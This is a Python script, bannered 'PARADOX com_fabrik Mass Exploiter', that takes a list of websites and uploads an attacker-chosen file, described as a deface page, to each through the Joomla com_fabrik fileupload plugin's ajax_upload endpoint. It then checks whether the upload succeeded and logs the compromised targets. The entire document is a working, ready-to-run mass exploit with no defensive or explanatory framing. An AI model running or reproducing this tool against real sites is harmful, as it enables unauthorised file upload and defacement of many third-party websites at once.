import requests, urllib, sys

print("""
:::::::::::::::::::::::::::::::::::::::::::
::                                       ::
::                PARADOX                ::
::      com_fabrik Mass Exploiter        ::
::                Usage :                ::
::    python CF.py list.txt sc.html      ::
::                                       ::
:::::::::::::::::::::::::::::::::::::::::::
""")

try:
    list = sys.argv[1]
    scrp = sys.argv[2]
except:
    print("[!] python "+sys.argv[0]+" list.txt script_deface.html\n")
    exit(1)

out = open('com_fabrik-output.txt', 'a')
print("[+] Exploiting Service Started !")
f = open(list, 'r')
while True:
 trgt = f.readline().replace('\n', '')
 if not trgt:
  break
 url = trgt+'index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload'
 fin = open(scrp, 'rb')
 files = {'file': fin}
 r = requests.post(url, files=files)
 cek = urllib.urlopen(trgt+scrp).getcode()
 if cek == 200:
  print(" | "+trgt+scrp+" -> SUCCESS")
  out.write(trgt+scrp+'\n')
 else:
  print(" | "+trgt+scrp+" -> FAILED")
  pass
print("[+] Service Exploiting Done !")
